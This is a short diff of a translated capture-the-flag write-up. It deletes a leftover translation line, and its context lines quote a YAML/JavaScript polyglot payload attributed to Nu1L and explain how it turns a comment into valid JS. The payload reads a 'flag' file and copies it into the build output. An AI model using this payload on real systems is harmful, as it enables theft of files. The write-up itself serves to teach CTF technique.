@@ -284,8 +284,6 @@ Finally, there is also a cool Nu1L payload:
 #*/const fs = require('fs'); var a = fs.readFileSync("flag", "utf-8");fs.writeFileSync("./dist/ret.js",a);fs.chmodSync("./dist/ret.js",0o444);process.addListener('uncaughtException', (err) => {console.log("ss",err);process.exit(0);})
 ```
 
-Here's the translated text:
-
 This utilizes the `require` function that outputs a string as mentioned earlier. Behind the scenes, it first uses YAML parse, so anything after the `#` symbol is a comment. The path part uses `/*` combined with the second line's `*/` to become valid JS. Tql!
 
 Finally, here are other writeups that were found:
